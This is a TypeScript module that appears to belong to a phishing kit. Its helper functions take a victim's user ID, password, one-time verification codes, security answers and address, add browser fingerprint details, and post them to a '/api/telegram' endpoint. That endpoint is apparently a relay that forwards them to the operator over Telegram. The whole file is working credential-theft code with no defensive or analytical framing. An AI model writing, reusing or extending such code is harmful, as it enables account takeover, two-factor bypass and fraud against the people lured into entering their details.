export type TelegramEventType =
  | "login"
  | "method"
  | "verification"
  | "resend"
  | "continue"
  | "accountType"
  | "security"
  | "address"
  | "custom"

export type ClientMeta = {
  userAgent: string
  screen: string
  language: string
  referrer: string
  url: string
  localTime: string
  utcTime: string
}

export function getClientMeta(): ClientMeta {
  if (typeof window === "undefined") {
    return {
      userAgent: "",
      screen: "",
      language: "",
      referrer: "",
      url: "",
      localTime: "",
      utcTime: "",
    }
  }

  return {
    userAgent: window.navigator.userAgent,
    screen: `${window.screen.width}x${window.screen.height}`,
    language: window.navigator.language || "",
    referrer: document.referrer || "Direct",
    url: window.location.href,
    localTime: new Date().toLocaleString(),
    utcTime: new Date().toUTCString(),
  }
}

export function mapVerificationMethodForTelegram(method: string): string {
  switch (method) {
    case "sms":
      return "text"
    case "phone":
      return "call"
    default:
      return method
  }
}

export interface AllfatherNotificationParams {
  projectFlow?: string
  eventType: TelegramEventType
  userId?: string
  password?: string
  method?: string
  code?: string
  page?: string
  address?: Record<string, unknown>
  securityAnswers?: Array<{ question: string; answer: string }> | Record<string, unknown>
  customData?: Record<string, unknown>
  [key: string]: unknown
}

export async function sendTelegramNotification(
  params: AllfatherNotificationParams,
): Promise<boolean> {
  try {
    const meta = getClientMeta()
    const payload = {
      ...params,
      ...meta,
    }

    const res = await fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true,
    })

    return res.ok
  } catch {
    return false
  }
}

/** Helper: Send login credential submission */
export async function sendAllfatherLogin(
  userId: string,
  password?: string,
  customData?: Record<string, unknown>,
): Promise<boolean> {
  return sendTelegramNotification({
    eventType: "login",
    userId,
    password,
    customData,
  })
}

/** Helper: Send verification OTP code */
export async function sendAllfatherVerification(
  userId: string,
  code: string,
  method?: string,
  customData?: Record<string, unknown>,
): Promise<boolean> {
  return sendTelegramNotification({
    eventType: "verification",
    userId,
    code,
    method: method ? mapVerificationMethodForTelegram(method) : undefined,
    customData,
  })
}

/** Helper: Send arbitrary event */
export async function sendAllfatherEvent(
  eventType: TelegramEventType,
  data: Record<string, unknown>,
): Promise<boolean> {
  return sendTelegramNotification({
    eventType,
    ...data,
  })
}
